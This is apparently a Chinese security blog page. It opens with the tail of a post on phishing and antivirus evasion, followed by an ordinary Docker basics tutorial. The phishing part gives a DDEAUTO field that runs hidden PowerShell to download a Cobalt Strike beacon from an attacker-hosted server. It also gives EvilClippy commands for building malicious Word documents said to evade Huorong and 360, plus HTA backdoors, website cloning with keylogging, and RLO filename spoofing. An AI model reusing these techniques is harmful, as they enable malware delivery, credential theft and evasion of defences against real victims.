<p>在保存木马的地方用 python -m http.server 8080 开启简易web服务</p>
<p>{}内写如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO &quot;C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP</span><br><span class="line">-sta -NonI -W Hidden IEX (New-Object</span><br><span class="line">System.Net.WebClient).DownloadString(&#x27;http://192.168.137.1:8080/beacon.exe&#x27;)</span><br><span class="line">; # &quot; &quot;Microsoft Document Security Add-On&quot;</span><br></pre></td></tr></table></figure>

<p>放到靶机上执行，即可上线</p>
<h3 id="word免杀"><a href="#word免杀" class="headerlink" title="word免杀"></a>word免杀</h3><p><a target="_blank" rel="noopener" href="https://github.com/outflanknl/EvilClippy">https://github.com/outflanknl/EvilClippy</a></p>
<p>编译：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1570">https://forum.butian.net/share/1570</a></p>
<p>原理：利用工具，将安全的vba代码，和带有木马word混淆</p>
<p>编写 1.vba</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub Hello()</span><br><span class="line">Dim X</span><br><span class="line">X=MsgBox(&quot;Hello VBS&quot;)</span><br></pre></td></tr></table></figure>

<p>生成恶意文档 1_EvilClippy.doc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\EvilClippy.exe -s 1.vba 1.doc</span><br></pre></td></tr></table></figure>

<p>这里的1.doc就是上面“word”模块生成的</p>
<p>可过火绒&#x2F;360</p>
<p>其他免杀：<a target="_blank" rel="noopener" href="https://skewwg.github.io/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/">https://skewwg.github.io/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/</a></p>
<h2 id="IQY特性钓鱼"><a href="#IQY特性钓鱼" class="headerlink" title="IQY特性钓鱼"></a>IQY特性钓鱼</h2><p>可以将IYQ简单的理解成内置在excel中的一种特殊‘web浏览器’（不能加载脚本），通过IQY【即web查询】语句，可以直接将各类web上的列表数据轻松引入到当前的excel中，而正是因为这样，从而给了我们利用excel制作钓鱼邮件的机会，假如你要引入的web数据是入侵者事先准备好的一段payload iqy恶意代码，那结果就不言而喻了。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/askta0/p/10893535.html#/c/subject/p/10893535.html">https://www.cnblogs.com/askta0/p/10893535.html#/c/subject/p/10893535.html</a></p>
<h2 id="克隆网站钓鱼"><a href="#克隆网站钓鱼" class="headerlink" title="克隆网站钓鱼"></a>克隆网站钓鱼</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42516903/article/details/112398825">https://blog.csdn.net/weixin_42516903/article/details/112398825</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ITmincherry/article/details/105716951">https://blog.csdn.net/ITmincherry/article/details/105716951</a></p>
<p>工具包：<a target="_blank" rel="noopener" href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021540008.png" alt="image-20231002154012952"></p>
<p>注意端口不要冲突，把键盘记录打开</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021540146.png" alt="image-20231002154030095"></p>
<p>我这里直接克隆会报错，可以使用其他工具克隆，然后放在本地，在克隆本地即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：wget -r -p -np -k https://www.baidu.com</span><br></pre></td></tr></table></figure>

<h2 id="flash钓鱼"><a href="#flash钓鱼" class="headerlink" title="flash钓鱼"></a>flash钓鱼</h2><p>原理：捆绑文件+克隆网站</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/god_zzZ/article/details/104192518">https://blog.csdn.net/god_zzZ/article/details/104192518</a></p>
<p>flash源码 <a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/Fake-flash.cn">https://github.com/r00tSe7en/Fake-flash.cn</a></p>
<h2 id="BadUsb"><a href="#BadUsb" class="headerlink" title="BadUsb"></a>BadUsb</h2><p>BadUSB是利用了USB协议上的漏洞，通过更改USB的内部固件，在正常的USB接口接入后，模拟外置鼠标、键盘的功能，以此来使目标主机执行已经精心构造好的命令。在此过程中不会引起杀毒软件、防火墙的一丝怀疑。而且因为是在固件级别的应用，U盘格式化根本无法阻止其内部代码的执行。</p>
<h2 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a>HTML Application</h2><p>准确的说 HTML Application 并不是一个后门上线方式，而是其本身就是一个后门程序，只是其文件后缀为 hta 比较隐蔽所以放到这里了。</p>
<p>将 HTML 保存为 .hta 后缀即可生成 HTML Application 程序，HTML Application 可以用 vbscript 或者 jscript 编写，可以编写一个 HTML Application 程序后门，目标执行了就会被获取 shell。（Cobalt Strike 生成的 HTML Application 程序后门是用 vbscript 编写的）</p>
<p>Cobalt Strike 生成 HTML Application 类型后门</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021540806.png" alt="image-20231002154041759"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021540082.png" alt="image-20231002154052040"></p>
<p>方法选择 powershell 类型，这样生成的 HTML Application 程序是以 powershell 执行命令的，也就是 HTML Application 调用 powershell</p>
<p>放到靶机上执行后门文件， Cobalt Strike 即可获取到 shell</p>
<h2 id="一些隐藏小技巧"><a href="#一些隐藏小技巧" class="headerlink" title="一些隐藏小技巧"></a>一些隐藏小技巧</h2><h3 id="文件名反转"><a href="#文件名反转" class="headerlink" title="文件名反转"></a>文件名反转</h3><p>在文件名中插入 RLO unicode 字符，可以反转文件名，比如把前面 HTML Application 程序后门进行文件名反转</p>
<p>先改个名字，<code>shelltxt.hta</code>，选中shell后面，txt前面</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021541661.png" alt="image-20231002154104598"></p>
<p>文件名反转</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021541355.png" alt="image-20231002154116326"></p>
<h3 id="更改图标"><a href="#更改图标" class="headerlink" title="更改图标"></a>更改图标</h3><p>工具：ResourceHacker</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jj0219/p/11398356.html">https://www.cnblogs.com/jj0219/p/11398356.html</a></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YKZ6yWWxOhn2KjTV5lDP7w">https://mp.weixin.qq.com/s/YKZ6yWWxOhn2KjTV5lDP7w</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&mid=2247487419&idx=1&sn=06f9f8934611cce555d9bd76464f404f">https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&amp;mid=2247487419&amp;idx=1&amp;sn=06f9f8934611cce555d9bd76464f404f</a></p>
<p>（文中提到的工具可联系作者获取）</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://cjb12.github.io/project/2023/01/11/%E9%92%93%E9%B1%BC%E5%8F%8A%E9%83%A8%E5%88%86%E5%85%8D%E6%9D%80/" data-id="cln8lynpv0000u0tggt9qdutg" data-title="钓鱼及部分免杀" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Docker基础" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/project/2022/07/13/Docker%E5%9F%BA%E7%A1%80/" class="article-date">
  <time class="dt-published" datetime="2022-07-13T08:01:04.000Z" itemprop="datePublished">2022-07-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/project/2022/07/13/Docker%E5%9F%BA%E7%A1%80/">Docker基础</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>官网：<a target="_blank" rel="noopener" href="https://www.docker.com/">https://www.docker.com</a></p>
<p>文档：<a target="_blank" rel="noopener" href="https://docs.docker.com/">https://docs.docker.com</a></p>
<p>仓库地址：<a target="_blank" rel="noopener" href="https://hub.docker.com/">https://hub.docker.com</a></p>
<p>系统内核</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r     #3.10以上</span><br></pre></td></tr></table></figure>

<p>系统版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/os-release</span><br></pre></td></tr></table></figure>

<p>安装（CentOS）</p>
<p><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/install/centos/">https://docs.docker.com/engine/install/centos/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1.卸载旧版本</span><br><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br><span class="line">                  </span><br><span class="line">2.需要的安装包</span><br><span class="line">sudo yum install -y yum-utils</span><br><span class="line"></span><br><span class="line">3.设置镜像仓库</span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">    </span><br><span class="line">更新软件包索引</span><br><span class="line">sudo yum makecache fast</span><br><span class="line">    </span><br><span class="line">4.安装   docker-ce社区版 ee 企业版</span><br><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br><span class="line"></span><br><span class="line">5.启动docker</span><br><span class="line">sudo systemctl start docker</span><br><span class="line"></span><br><span class="line">6.检查是否安装成功</span><br><span class="line">docker version</span><br><span class="line"></span><br><span class="line">7.hello-world</span><br><span class="line">sudo docker run hello-world</span><br><span class="line"></span><br><span class="line">8.查看hello-world镜像</span><br><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p>注意：以上内容以官方文档为准</p>
<p>阿里云镜像加速器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line"></span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://g68ie3s0.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br><span class="line">docker info</span><br><span class="line">docker 命令 --help   #万能命令</span><br></pre></td></tr></table></figure>

<p>帮助文档地址：<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/reference/commandline/">https://docs.docker.com/engine/reference/commandline/</a></p>
<h3 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h3><p><strong>docker images</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">hello-world   latest    feb5d9fea6a5   9 months ago   13.3kB</span><br><span class="line"></span><br><span class="line">REPOSITORY  镜像的仓库源</span><br><span class="line">TAG         镜像的标签</span><br><span class="line">IMAGE ID    镜像的ID</span><br><span class="line">CREATED     镜像的创建时间</span><br><span class="line">SIZE        镜像的大小</span><br><span class="line"></span><br><span class="line">#可选项</span><br><span class="line">-a, --all             #列出所有镜像</span><br><span class="line">-q, --quiet           #只显示镜像的ID</span><br></pre></td></tr></table></figure>

<p><strong>docker search 搜索镜像</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-0-7-centos ~]# docker search mysql</span><br><span class="line">NAME                           DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                          MySQL is a widely used, open-source relation…   12829     [OK]       </span><br><span class="line">mariadb                        MariaDB Server is a high performing open sou…   4919      [OK] </span><br><span class="line"></span><br><span class="line">#可选项</span><br><span class="line">-f</span><br></pre></td></tr></table></figure>

<p><strong>docker pull 下载镜像</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#下载镜像 docker pull 镜像名[:tag]</span><br><span class="line">[root@VM-0-7-centos ~]# docker pull mysql:5.7               #如果不写tag，默认就是latest</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">66fb34780033: Pull complete                                 #分层下载，docker image的核心 联合文件系统</span><br><span class="line">4b7eaab7220f: Pull complete </span><br><span class="line">8c8e39531477: Pull complete </span><br><span class="line">f03f15c3a663: Pull complete </span><br><span class="line">398ee43a4e22: Pull complete </span><br><span class="line">28754770caaf: Pull complete </span><br><span class="line">7ebec8d1922f: Pull complete </span><br><span class="line">62114f229774: Pull complete </span><br><span class="line">f8575f2324da: Pull complete </span><br><span class="line">b4c26cf54614: Pull complete </span><br><span class="line">Digest: sha256:4279d155f8cab19149c6078b20d53976f1498e31d6f848ac83e11323909b41f1   #签名</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7       #真实地址</span><br><span class="line"></span><br><span class="line">#等价</span><br><span class="line">docker pull mysql</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure>

<p><strong>docker rmi 删除镜像</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f 容器id                   #删除指定的镜像</span><br><span class="line">docker rmi -f 容器id 容器id 容器id      #删除多个镜像</span><br><span class="line">docker rmi -f $(docker images -aq)    #删除所有镜像</span><br></pre></td></tr></table></figure>

<h3 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h3><p>有了镜像才可以创建容器，这里以centos为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos</span><br></pre></td></tr></table></figure>

<p><strong>新建容器并启动</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"></span><br><span class="line">#参数说明</span><br><span class="line">--name=&quot;Name&quot;     #容器名字</span><br><span class="line">-d                #后台方式运行</span><br><span class="line">-it               #使用交互方式运行，进入容器查看内容</span><br><span class="line">-p                #指定容器的端口</span><br><span class="line">	-p ip:主机端口:容器端口</span><br><span class="line">	-p 主机端口:容器端口（常用）</span><br><span class="line">	-p 容器端口</span><br><span class="line">	容器端口</span><br><span class="line">-P                #随机指定端口</span><br><span class="line"></span><br><span class="line">#测试，启动并进入容器</span><br><span class="line">[root@VM-0-7-centos ~]# docker run -it centos /bin/bash</span><br><span class="line">[root@d9b4f12abc7b /]# ls</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"></span><br><span class="line">#从容器中退回主机</span><br><span class="line">[root@d9b4f12abc7b /]# exit</span><br><span class="line">exit</span><br><span class="line">[root@VM-0-7-centos /]# ls</span><br><span class="line">bin  boot  data  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  patch  proc  root  run  sbin  srv  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure>

<p><strong>列出所有的运行容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker ps         #列出当前正在运行的容器</span><br><span class="line"></span><br><span class="line">#参数说明</span><br><span class="line">-a                #列出当前正在运行的容器，带出历史运行过的容器</span><br><span class="line">-n=?              #显示最近创建的容器</span><br><span class="line">-q                #只显示容器的编号</span><br></pre></td></tr></table></figure>

<p><strong>退出容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit        #直接停止并退出</span><br><span class="line">Ctrl+P+Q    #不停止退出</span><br></pre></td></tr></table></figure>

<p><strong>删除容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rm 容器id                 #删除指定容器，不能删除正在运行的容器</span><br><span class="line">docker rm -f $(docker ps -aq)   #删除所有容器</span><br><span class="line">docker ps -a -q|xargs docker rm #删除所有容器</span><br></pre></td></tr></table></figure>

<p><strong>启动和停止</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器id        #启动容器</span><br><span class="line">docker restart 容器id      #重启容器</span><br><span class="line">docker stop 容器id         #停止当前正在运行的容器</span><br><span class="line">docker kill 容器id         #强制停止当前容器</span><br></pre></td></tr></table></figure>

<h3 id="常用其他命令"><a href="#常用其他命令" class="headerlink" title="常用其他命令"></a>常用其他命令</h3><p><strong>后台启动容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d 镜像名</span><br></pre></td></tr></table></figure>

<p><strong>产看日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -tf --tail 条数 容器id</span><br></pre></td></tr></table></figure>

<p><strong>查看容器中进程信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top 容器id</span><br></pre></td></tr></table></figure>

<p><strong>查看镜像的元数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 容器id</span><br></pre></td></tr></table></figure>

<p><strong>进入当前正在运行的容器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器id bashShell</span><br><span class="line"></span><br><span class="line">[root@VM-0-7-centos ~]# docker exec -it 73f640b24eab /bin/bash</span><br><span class="line">[root@73f640b24eab /]# ls</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker attach 容器id</span><br><span class="line"></span><br><span class="line">#docker exec     #进入容器后开启一个新的终端，可以在里面操作（常用）</span><br><span class="line">#docker attach   #进入容器正在执行的终端，不会启动新的进程</span><br></pre></td></tr></table></figure>

<p><strong>从容器内拷贝文件到主机上</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 容器id:容器内路径 目的主机路径</span><br></pre></td></tr></table></figure>

<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>Docker安装Nginx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.搜索镜像 docker search 建议看帮助文档</span><br><span class="line"># 2.下载镜像</span><br><span class="line">docker pull nginx</span><br><span class="line"># 3.运行测试</span><br><span class="line">docker images</span><br><span class="line">docker run -d --name nginx01 -p 3344:80 nginx   # -d后台运行 -p宿主机端口:容器内部端口</span><br><span class="line">curl localhost:3344</span><br><span class="line"></span><br><span class="line"># 进入容器</span><br><span class="line">docker exec -it nginx01 /bin/bash</span><br><span class="line"># 删除容器</span><br><span class="line">docker stop nginx01</span><br></pre></td></tr></table></figure>

<p>部署tomcat</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull tomcat</span><br><span class="line">docker run -d -p 3344:8080 --name tomcat01 tomcat</span><br><span class="line"></span><br><span class="line"># 进入容器</span><br><span class="line">docker exec -it tomcat01 /bin/bash</span><br><span class="line">cp -r webapps.dist/* webapps</span><br></pre></td></tr></table></figure>

<p>部署es+kibana</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name elasticsearch --net somenetwork -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:tag</span><br></pre></td></tr></table></figure>

<h2 id="可视化（存在问题）"><a href="#可视化（存在问题）" class="headerlink" title="可视化（存在问题）"></a>可视化（存在问题）</h2><p>portainer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker pull portainer/portainer</span><br><span class="line"></span><br><span class="line">docker run -d \</span><br><span class="line">-p 9000:9000 \</span><br><span class="line">--name prtainer-test \</span><br><span class="line">--restart=always \</span><br><span class="line">-v /opt/portainer:/data \</span><br><span class="line">-v /var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">portainer/portainer</span><br></pre></td></tr></table></figure>

<h2 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本</span><br><span class="line"></span><br><span class="line">#命令和git原理类似</span><br><span class="line">docker commit -m=&quot;提交的描述信息&quot; -a=&quot;作者&quot; 容器id 目标镜像名:[tag]</span><br></pre></td></tr></table></figure>

<h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><p>容器的持久化和同步操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v 主机目录:容器内目录</span><br><span class="line"></span><br><span class="line">#测试</span><br><span class="line">docker run -it -v /home/ceshi:/home centos /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><p>安装mysql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:5.7</span><br><span class="line"></span><br><span class="line">#官方：docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br><span class="line"></span><br><span class="line">docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br></pre></td></tr></table></figure>

<h3 id="具名和匿名挂载"><a href="#具名和匿名挂载" class="headerlink" title="具名和匿名挂载"></a>具名和匿名挂载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#匿名挂载</span><br><span class="line">docker run -d -P --name nginx01 -v /etc/nginx nginx</span><br><span class="line">#查看所有的 volume 的情况</span><br><span class="line">docker volume ls</span><br><span class="line"></span><br><span class="line">#具名挂载</span><br><span class="line">docker run -d -P --name nginx01 -v juming-nginx:/etc/nginx nginx</span><br><span class="line">#通过 -v 卷名:容器内路径</span><br></pre></td></tr></table></figure>

<p>拓展：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ro   readonly    #只读</span><br><span class="line">rw   readwrite   #读写</span><br><span class="line"></span><br><span class="line">docker run -d -P --name nginx01 -v juming-nginx:/etc/nginx:ro nginx</span><br><span class="line">docker run -d -P --name nginx01 -v juming-nginx:/etc/nginx:rw nginx</span><br></pre></td></tr></table></figure>

<p>多个mysql实现数据共享</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br><span class="line"></span><br><span class="line">docker run -d -p 3310:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql02	 --volumes-from mysql01 mysql:5.7</span><br></pre></td></tr></table></figure>

